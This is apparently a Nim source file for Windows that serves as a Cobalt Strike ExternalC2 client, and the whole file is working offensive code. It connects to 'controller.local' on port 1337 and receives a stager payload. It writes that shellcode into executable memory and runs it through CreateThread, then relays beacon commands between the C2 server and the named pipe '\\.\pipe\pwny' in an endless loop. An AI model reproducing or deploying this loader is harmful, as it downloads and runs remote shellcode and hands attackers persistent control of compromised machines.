import inc/struct
import std/net
import winim/lean
import sequtils,strutils,os

proc encodeFrame(data: string): string =
    var data: string = pack("<I", len(data)) & data
    return data

proc decodeFrame(data: string): (string,int) =

    let length = unpack("<I",data[0..<4])[0].getInt
    let body = data[4..^1]
    return (body,length)

proc recvFromController(sock: net.Socket): (int,string) =
  var data: string = ""
  var length = sock.recv(4)
  var l = unpack("<I",length)[0].getInt
  echo "[+] Stager Length :",l
  while data.len < l:
    var  chunk = sock.recv(l - len(data))
    data.add(chunk)
  return (l,data)

proc sendToController(sock: net.Socket,data: string): void =
    sock.send(encodeFrame(data))

proc toString(str: seq[char]): string =
  result = newStringOfCap(len(str))
  for ch in str:
    add(result, ch)
  
######################
proc readFromPipe(pipehandle: HANDLE):  string =

  var
    bytesRead: DWORD
    bufferlen:array[4,char]

  ReadFile(
    pipehandle,
    addr bufferlen,
    (DWORD)0x4,
    addr bytesRead,
    NULL
  )
  var leng:int = unpack("<I",toString(bufferlen.toSeq()))[0].getInt
    
  echo "[+] Bytes Read from pipe: ",bytesRead
  echo "[*] body : ", bufferlen
  echo "[*] Buffer length : ",leng
  #[GET LENGTH , NEXT GET DATA]#

  var data:seq[char]  # Set this to the size you need
  data.setLen(leng)
  ReadFile(pipehandle, data[0].addr ,(DWORD)leng,addr bytesRead,NULL)
  return toString(data)


################
proc injectBeacon(scode: openarray[byte]): void =
  var mem = VirtualAlloc(nil, len(scode), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
  echo "allocation Memory : " , cast[int](mem).toHex
  copyMem(mem, scode[0].addr, len(scode))
  let tHandle = CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](mem), nil, 0, cast[LPDWORD](0))


proc connectTopipe(pipename:string): HANDLE =

  var pipe: HANDLE = CreateFile(
    pipename,
    GENERIC_READ or GENERIC_WRITE, 
    0,
    NULL,
    OPEN_EXISTING,
    0,
    0
  )
  return pipe


proc writeToPipe(pipehandle: HANDLE,data:string,length:int): void = 
  var strlen = pack("<I",length)
  var strl2:cstring = $strlen
  var bytesWritten:DWORD
  WriteFile(pipeHandle,strl2,(DWORD)0x4,addr bytesWritten,NULL)
  var data2:cstring = $data
  WriteFile(pipeHandle,data2,(DWORD)data.len,addr bytesWritten,NULL)

let client: net.Socket = newSocket(AF_INET, SOCK_STREAM, IPPROTO_IP)
client.connect("controller.local", Port(1337))
stdout.writeLine("Connected To CS ExternalC2 at PORT 1337")

#[ CONNECTED TO CONTROLLER C2
NEXT: Receive the Stager 
]#
var (length,data)= recvFromController(client)
echo "[+] Stager Length :",length
echo "[+] Stager data :",data[0..<4]
let bytes: seq[byte] = data.toSeq.map(proc(x: char): byte = byte(x))


injectBeacon(bytes)

var pipeHandle: HANDLE = INVALID_HANDLE_VALUE
while pipeHandle == INVALID_HANDLE_VALUE:
  sleep(1000)
  pipeHandle= connectTopipe(r"\\.\pipe\pwny")
  echo "pipeHandle : ",pipeHandle

while true:
  var pld = readFromPipe(pipeHandle)
  sendToController(client,pld)
  (length,data) = recvFromController(client)
  writeToPipe(pipeHandle,data,length)
